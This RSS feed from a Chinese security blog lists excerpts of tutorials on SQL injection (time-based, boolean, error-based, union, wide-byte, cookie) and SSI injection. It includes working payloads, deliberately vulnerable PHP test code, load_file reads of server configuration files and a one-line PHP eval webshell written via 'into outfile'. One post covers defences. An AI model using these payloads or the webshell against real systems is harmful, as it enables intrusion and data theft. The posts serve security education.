<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Injection on </title>
    <link>http://wyb0.com/tags/injection/</link>
    <description>Recent content in Injection on </description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <lastBuildDate>Wed, 23 May 2018 11:14:51 +0800</lastBuildDate>
    
	<atom:link href="http://wyb0.com/tags/injection/index.xml" rel="self" type="application/rss+xml" />
    
    
    <item>
      <title>SQL注入的一些tips</title>
      <link>http://wyb0.com/posts/some-tips-for-sql-injection/</link>
      <pubDate>Wed, 23 May 2018 11:14:51 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/some-tips-for-sql-injection/</guid>
      <description>环境：MySQL 5.5.47
0x00 基于时间的注入payload mysql&amp;gt; select if((select database()) like &amp;quot;rte%&amp;quot;,sleep(2),null); +---------------------------------------------------+ | if((select database()) like &amp;quot;rte%&amp;quot;,sleep(2),null) | +---------------------------------------------------+ | 0 | +---------------------------------------------------+ 1 row in set (2.00 sec) mysql&amp;gt; select if((select database())=&amp;quot;rteaaa&amp;quot;,sleep(2),666); +-----------------------------------------------+ | if((select database())=&amp;quot;rtest1&amp;quot;,sleep(2),666) | +-----------------------------------------------+ | 666 | +-----------------------------------------------+ 1 row in set (0.00 sec) mysql&amp;gt; select if((select database())=&amp;quot;rtest&amp;quot;,sleep(2),666); +----------------------------------------------+ | if((select database())=&amp;quot;rtest&amp;quot;,sleep(2),666) | +----------------------------------------------+ | 0 | +----------------------------------------------+ 1 row in set (2.00 sec)  mysql&amp;gt; select id,name,title from msg where id=if(1=1,benchmark(10000000,md5(11)),false); Empty set (2.</description>
    </item>
    
    <item>
      <title>ThinkPHP5的where函数</title>
      <link>http://wyb0.com/posts/thinkphp5-where-function/</link>
      <pubDate>Mon, 16 Apr 2018 19:16:14 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/thinkphp5-where-function/</guid>
      <description>0x00 关于thinkphp5的where函数 年前公司委托别的公司开发一个网站，使用的是ThinkPHP5.0，存在一个注入漏洞，分析后发现是因为tp5中的where函数使用不当，tp5中where这个函数可以接收字符串和数组这两种类型的参数来进行查询，而在用字符串这种传递方式时，如果使用不当的话就可能会出现sql注入。
0x01 示例代码 tp5/application/home/controller/Index.php
&amp;lt;?php namespace app\home\controller; use think\Db; class Index { public function testDb() { $msg = db(&#39;msg&#39;); $id = input(&#39;param.id&#39;,1); //不存在id的话默认为1 $where = &amp;quot;id=&amp;quot;.$id; $result = $msg-&amp;gt;where($where)-&amp;gt;select(); // $result = $msg-&amp;gt;where([&#39;id&#39;=&amp;gt;$id])-&amp;gt;select(); echo $msg-&amp;gt;getLastSql(); echo &#39;&amp;lt;br/&amp;gt;&amp;lt;br/&amp;gt;&#39;; echo var_dump($result); } }  访问http://127.0.0.1/Source/tp5/home/index/testdb/id/1时返回的语句分别如下：
SELECT * FROM `msg` WHERE ( id=1 ) SELECT * FROM `msg` WHERE `id` = 1  前者存在注入，如下： 主要调用文件及函数顺序如下：
tp5/thinkphp/library/think/db/Query.php __construct() tp5/thinkphp/library/db/Builder.php __construct() tp5/thinkphp/library/think/db/Query.php where() tp5/thinkphp/library/think/db/Query.</description>
    </item>
    
    <item>
      <title>SSI注入</title>
      <link>http://wyb0.com/posts/ssi-injection/</link>
      <pubDate>Thu, 08 Jun 2017 11:20:15 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/ssi-injection/</guid>
      <description> 0x00 SSI SSI (Server Side Includes)是HTML页面中的指令，在页面被提供时由服务器进行运算，以对现有HTML页面增加动态生成的内容，而无须通过CGI程序提供其整个页面，或者使用其他动态技术。
在很多场景中，用户输入的内容可以显示在页面中，一个存在反射XSS漏洞的页面，如果输入的payload不是xss代码而是ssi的标签，服务器又开启了ssi支持的话就会存在SSI漏洞
若注入点在url中则可能需要进行url编码
0x01 payload &amp;quot;--&amp;gt;&#39;--&amp;gt;`--&amp;gt;&amp;lt;!--#set var=&amp;quot;a&amp;quot; value=&amp;quot;123&amp;quot;--&amp;gt;&amp;lt;!--#set var=&amp;quot;b&amp;quot; value=&amp;quot;654&amp;quot;--&amp;gt;&amp;lt;!--#echo var=&amp;quot;a&amp;quot;--&amp;gt;&amp;lt;!--#echo var=&amp;quot;b&amp;quot;--&amp;gt; &amp;lt;!--#echo var=&amp;quot;DATE_LOCAL&amp;quot; --&amp;gt; &amp;lt;!--#exec cmd=&amp;quot;dir&amp;quot; --&amp;gt;  0x02 示例  Referer被输出到了页面中   url中的数据被输出到页面中(有时候url中的payload需要url编码)  </description>
    </item>
    
    <item>
      <title>SQL注入之宽字节注入</title>
      <link>http://wyb0.com/posts/injection-of-wide-byte/</link>
      <pubDate>Fri, 24 Jun 2016 10:25:11 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/injection-of-wide-byte/</guid>
      <description>0x00 应用场景 在注入时通常会使用单引号、双引号等特殊字符。在应用中，通常为了安全，开发者会开启php的magic_quotes_gpc，或者使用addslashes、mysql_real_escape_string等函数对客户端传入的参数进行过滤，则注入的单引号或双引号就会被&amp;quot;\&amp;quot;转义，但是，如果服务端的数据库使用的是GB2312、GBK、GB18030等宽字节的编码时，则依然会造成注入。
0x01 测试代码 &amp;lt;?php $conn = mysql_connect(&#39;localhost&#39;,&#39;root&#39;,&#39;root&#39;); mysql_select_db(&#39;messages&#39;,$conn); if (isset($_GET[&#39;id&#39;])) { $id = addslashes($_GET[&#39;id&#39;]); //转义id $sql = &amp;quot;select * from msg where id=&#39;$id&#39;;&amp;quot;; echo $sql.&amp;quot;&amp;lt;br /&amp;gt;&amp;quot;; $result = mysql_query($sql); $rows = @mysql_fetch_assoc($result); if ($rows) { echo &#39;&amp;lt;table align=&amp;quot;left&amp;quot; border=&amp;quot;1&amp;quot;&amp;gt;&#39;; foreach ($rows as $key =&amp;gt; $value) { echo &#39;&amp;lt;tr align=&amp;quot;lift&amp;quot; height=&amp;quot;30&amp;quot;&amp;gt;&#39;; echo &#39;&amp;lt;td&amp;gt;&#39;.$key.&#39;----&#39;.$value.&#39;&amp;lt;/td&amp;gt;&#39;; echo &#39;&amp;lt;/tr&amp;gt;&#39;; } echo &#39;&amp;lt;/table&amp;gt;&#39;; } else { echo mysql_error(); } } else { echo &amp;quot;please input id.</description>
    </item>
    
    <item>
      <title>SQL注入之防御</title>
      <link>http://wyb0.com/posts/injection-of-defense/</link>
      <pubDate>Thu, 23 Jun 2016 15:32:34 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/injection-of-defense/</guid>
      <description>0x00 要做的事 也就是找到注入点然后修复
0x01 防御方法  使用预编译语句绑定变量(比如php的mysqli、pdo)
&amp;lt;?php //预编译 $mysqli = new mysqli(&amp;quot;localhost&amp;quot;,&amp;quot;root&amp;quot;,&amp;quot;123456&amp;quot;,&amp;quot;share&amp;quot;); $mysqli-&amp;gt;query(&amp;quot;set names utf8&amp;quot;); $sql = &amp;quot;INSERT INTO test (name,sex,age) VALUE(?,?,?)&amp;quot;; $s = $mysqli-&amp;gt;prepare($sql); //绑定参数 $name = &amp;quot;Tom&amp;quot;; $sex = &amp;quot;M&amp;quot;; $age = 23; $s-&amp;gt;bind_param(&amp;quot;ssi&amp;quot;,$name,$sex,$age);//ssi的意思是字符、字符、整型 //执行 $result = $s-&amp;gt;execute(); var_dump($result); $s-&amp;gt;close(); ?&amp;gt;  使用存储过程(这里以SQLServer举例)
  --如果存在名为get_student_msg(相当于函数)的存储过程则删除 IF EXISTS (SELECT name FROM sysobjects WHERE name=&#39;get_student_msg&#39; AND type=&#39;p&#39;) DROP PROCEDURE get_student_msg CREATE PROCEDURE get_student_msg --创建存储过程 @name VARCHAR(20) --声明全局变量 AS BEGIN SELECT * from info WHERE name=@name END GO --创建好存储过程后在其他地方直接使用函数并传参就行了 EXEC get_student_msg &#39;xiaoli&#39;   使用转义函数</description>
    </item>
    
    <item>
      <title>SQL注入之布尔型注入</title>
      <link>http://wyb0.com/posts/injection-of-boolian-based/</link>
      <pubDate>Wed, 22 Jun 2016 23:32:34 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/injection-of-boolian-based/</guid>
      <description>0x00 特点 当页面存在注入，但是没有显示位，且没有用echo &amp;quot;mysql_error()&amp;quot;输出错误信息时可以用， 它一次只能猜测一个字节，速度慢，但是只要存在注入就能用  0x01 利用方式 用and连接前后语句：www.xxx.com/aa.php?id=1 and (注入语句) --+ 根据返回页面是否相同来得到数据  0x02 注入步骤  找到注入点，判断闭合字符  尝试猜解列数，得到显示位  得到数据库名 最终得到第五个数据库名为security
 得到表名 最终依次猜的表名为users
 得到列名 同理最终得到第2列列名为username，第3列列名为password
 得到列值 依次得到为admin4，同理可得其他数据
  0x04 附上python脚本 #!/usr/bin/env python # -*- coding: utf-8 -*- # code by reber &amp;lt;1070018473@qq.com&amp;gt; __author__=&amp;quot;reber&amp;quot; import sys import requests import binascii import hashlib from pyfiglet import figlet_format from optparse import OptionParser def get_md5_html(url): html = requests.</description>
    </item>
    
    <item>
      <title>SQL注入之报错型注入</title>
      <link>http://wyb0.com/posts/injection-of-error-based/</link>
      <pubDate>Wed, 22 Jun 2016 15:30:54 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/injection-of-error-based/</guid>
      <description>0x00 前提 一般是在页面没有显示位、但用echo mysql_error();输出了错误信息的时候使用， 它的特点是注入速度快，但是语句较复杂,不能用group_concat(),只能用limit依次猜解  0x01 利用方式 报错注入只要套用公式即可，公式如下(第一个公式count(*)、floor()、rand()、group by不可或缺，后两个公式有32位的限制):
?id=2&amp;rsquo; and (select 1 from (select count(*),concat( floor(rand(0)*2),(select (select (查询语句)) from information_schema.tables limit 0,1))x from information_schema.tables group by x )a )--+
?id=2&amp;rsquo; and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)--+
?id=1&amp;rsquo; and extractvalue(1, concat(0x7e, (select @@version),0x7e))--+
0x02 公式解析 floor()是取整数 rand()在0和1之间产生一个随机数 rand(0)*2将取0到2的随机数 floor(rand()*2)有两条记录就会报错 floor(rand(0)*2)记录需为3条以上，且3条以上必报错，返回的值是有规律的 count(*)是用来统计结果的，相当于刷新一次结果 group by对数据分组时会先看看虚拟表里有没有这个值,若没有就插入,若存在则count(*)加1 group by时floor(rand(0)*2)会被执行一次,若虚表不存在记录,插入虚表时会再执行一次  0x03 注入步骤  猜测闭合字符  猜测列数  尝试得到显示位  报错得到数据库个数  报错得到数据库名  报错得到表名  报错得到列名  得到列值   0x04 附上利用代码 #!</description>
    </item>
    
    <item>
      <title>SQL注入之联合查询</title>
      <link>http://wyb0.com/posts/injection-of-union-select/</link>
      <pubDate>Tue, 21 Jun 2016 22:30:18 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/injection-of-union-select/</guid>
      <description> 0x00 前提 要用联合查询进行注入则：页面必须有显示位
0x01 联合查询 union可合并两个或多个select语句的结果集，前提是两个select必有相同列、且各列的数据类型也相同
0x02 注入步骤  找到注入点得到闭合字符  判断数据库类型  猜解列数，得到显示位  得到基本信息(数据库名、版本、数据库版本等)  得到数据库  得到security数据库的表名  猜解列名  猜解数据   </description>
    </item>
    
    <item>
      <title>SQL注入之MySQL函数利用</title>
      <link>http://wyb0.com/posts/injection-of-mysql-function/</link>
      <pubDate>Mon, 20 Jun 2016 08:10:27 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/injection-of-mysql-function/</guid>
      <description>0x00 load_file()  条件:  1. 要有file_priv权限 2. 知道文件绝对路径 3. 能使用union 4. 对web目录有读权限 注：若过滤了单引号，则可以将函数中的字符进行hex编码   一般步骤
 读/etc/init.d下的东西，这里有配置文件路径
?id=1&#39; union select 1,2,load_file(&#39;/etc/init.d/httpd&#39;)  得到web安装路径
?id=1&#39; union select 1,2,load_file(&#39;/etc/apache/conf/httpd.conf&#39;)  读取密码文件
?id=1&#39; union select 1,2,load_file(&#39;/site/xxx.com/conf/conn.inc.php&#39;)    0x01 into outfile  条件：  1. 要有file_priv权限 2. 知道网站绝对路径 3. 要能用union 4. 对web目录有写权限 5. 没有过滤单引号   一般方法
当知道路径时，可以直接用?id=1 union select &amp;ldquo;&amp;lt;?php @eval($_POST[&amp;lsquo;c&amp;rsquo;]);?&amp;gt;&amp;rdquo; into outfile(&amp;ldquo;C:/phpStudy/WWW/a.php&amp;rdquo;)
 其他方法
 登陆phpMyAdmin
use test; 选择数据库为test create table aaa(bbb varchar(64)); 在数据库中创建一个表aaa insert into aaa values(&amp;quot;&amp;lt;?</description>
    </item>
    
    <item>
      <title>SQL注入之判断数据库类型</title>
      <link>http://wyb0.com/posts/injection-of-check-database-type/</link>
      <pubDate>Sun, 19 Jun 2016 22:15:52 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/injection-of-check-database-type/</guid>
      <description>0x00 常见手段 扫描端口、指纹、抓包查看http头信息、在网址后面直接判断
0x01 根据各数据库特有函数判断  Access:
and (select count(*) from MSysAccessObjects)&amp;gt;0 返回正常说明是access and exists(select count(*) from表) ID=1 and (select count (*) from sysobjects)&amp;gt;0 返回异常 ID=1 and (select count (*) from msysobjects)&amp;gt;0返回异常  SQLServer:
and (select count(*) from sysobjects) &amp;gt;0 返回正常说明是mssql ID=1 and (select count (*) from sysobjects)&amp;gt;0 返回正常 ID=1 and (select count (*) from msysobjects)&amp;gt;0返回异常 ID=1 and left(version(),1)=5%23 //红色字体也可能是4 ID=1 and exists(select id from sysobjects) ID=1 and len(user)&amp;gt;0 ID=1 CHAR(97)+CHAR(110)+CHAR(100)+CHAR(32)+CHAR(49)+CHAR(61)+CHAR(49)  MySQL:</description>
    </item>
    
    <item>
      <title>SQL注入</title>
      <link>http://wyb0.com/posts/injection/</link>
      <pubDate>Sun, 19 Jun 2016 19:40:25 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/injection/</guid>
      <description>0x00 含义 sql注入是将代码插入(拼接)到应用(用户)的输入参数中，之后再将这些参数传递给后台的SQL服务器加以解析并执行的攻击，
总结起来就是攻击者将恶意代码拼接到sql语句并加以执行从而得到数据的过程。
0x01 成因 SQl语句未对用户参数进行严格过滤  0x02 可引发注入的地方 其实只要是客户端可控、参数值代入数据库查询的地方都可能存在注入 常见的如下，按出现频率排序： 1. GET 2. POST 3. X-Forwarded-For 4. Cookie 5. User-Agent  0x03 注入分类 根据语法(较权威)： 1. 可联合查询注入: 只要页面有显示位即可使用，且注入速度很快 2. 报错型注入: 没有显示位但用echo &amp;quot;mysql_error()&amp;quot;输出了错误信息，速度很快，但是语句较复杂 3. 布尔型注入: 一次一个字节，速度慢，但只要有注入就能用 4. 基于时间延迟注入: 超级慢，比布尔型注入慢几倍，但是通用性较强 5. 可多语句查询: 只有SQL Server可以使用 根据类型： 1. 整形 2. 字符串型 3. 搜索型  0x04 查找注入点 在URL中： 1. and 1=1/and 1=2(整型) 2. 随即输入(整型) 3. -1/+1 回显上下页面(整型) 4. 单引号(字符型/整型) 5. and sleep(5) (判断页面返回时间) 在http头： 1.</description>
    </item>
    
    <item>
      <title>各种参数类型注入</title>
      <link>http://wyb0.com/posts/various-parameter-types-injected/</link>
      <pubDate>Sun, 20 Dec 2015 20:08:47 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/various-parameter-types-injected/</guid>
      <description>0x00 分类 根据注入时提交的变量参数类型，SQL注入点有不同的分类，不同的注入点，其注入时需要注意的事项也有所不同。按提交参数类型，SQL注入点主要分为下面3种：即数字型注入点、字符型注入点和搜索型注入点
0x01 数字型注入点 形如&amp;rdquo;http://www.xxx.com/a.asp?ID=55&amp;quot; ，这类注入的参数是&amp;rdquo;数字&amp;rdquo;，因此称为&amp;rdquo;数字型注入点&amp;rdquo;。 此类注入点提交的SQL语句，其原形大致为：select * from 表名 where 字段=55
当提交&amp;rdquo;http://www.xxx.com/a.asp?ID=55 And [查询条件]&amp;ldquo;时，向数据库提交的完整SQL语句为：
select * from 表名 where 字段=55 and [查询条件]
0x02 字符型注入点 形如&amp;rdquo;http://www.xxx.com/a.asp?Class=0123&amp;quot;这类注入的参数是&amp;quot;字符&amp;quot;，称为&amp;quot;字符型&amp;quot;注入点。
此类注入点提交的 SQL 语句，其原形大致为：
select * from 表名 where 字段=&amp;lsquo;日期&amp;rsquo;
当提交&amp;rdquo;http://www.xxx.com/a.asp?Class=日期 And [查询条件]&amp;ldquo;时，向数据库提交的SQL语句为：
select * from 表名 where 字段=&amp;lsquo;日期&amp;rsquo; and [查询条件]
0x03 搜索型注入点 这是一类特殊的注入类型。
这类注入主要是指在进行数据搜索时没过滤搜索参数，一般在链接地址中有&amp;rdquo;keyword=关键字&amp;rdquo;，有的不显示的链接地址，而是直接通过搜索框表单提交。
此类注入点提交的 SQL 语句，其原形大致为：
select * from 表名 where 字段 like &amp;lsquo;%关键字%&amp;rsquo;
当我们提交注入参数为&amp;rdquo;keyword=&amp;lsquo;and[查询条件] and &amp;lsquo;%&amp;rsquo;=&amp;lsquo;,则向数据库提交的完整SQL语句为：
select * from 表名 where 字段 like &amp;lsquo;%&amp;rsquo; and [查询条件] and &amp;lsquo;%&amp;rsquo;=&amp;lsquo;%&amp;rsquo;</description>
    </item>
    
    <item>
      <title>ASP简单Cookie注入</title>
      <link>http://wyb0.com/posts/cookie-injection-of-asp/</link>
      <pubDate>Fri, 04 Dec 2015 19:42:19 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/cookie-injection-of-asp/</guid>
      <description> 0x00 Cookie注入的使用  三大Web提交方式
 GET：直接在浏览器上面访问地址
 POST：提交表单(会员注册、文件上传等)
 COOKIE：访问网站下面自带的身份验证的值  Cookie注入利用时机
当用普通注入时，采用and 1=1时出现错误提示(如下图)，普通的注入就没办法了，可以尝试大小写，编码等绕过，若过滤严谨，无法绕过，这时就可以采用cookie注入。  利用方法
 可以利用注入中转 可以利用sqlmap   0x01 用注入中转进行Cookie注入  目标：http://localhost:81/2/shownews.asp?id=183
 打开注入中转这个工具，填入相应参数，然后点击生成ASP，将生成的asp文件(jmCook.asp)放入你自己搭建的网站内后即可进行注入  提交localhost:81/jmCook.asp?jmdcw=183 order by猜测字段数
 提交localhost:81/jmCook.asp?jmdcw=183 UNION SELECT 1,2,3,4 from XXX猜测表名  猜测内容   0x02 用sqlmap进行Cookie注入  sqlmap验证存在Cookie注入  猜表名  猜列名  猜字段内容   </description>
    </item>
    
  </channel>
</rss>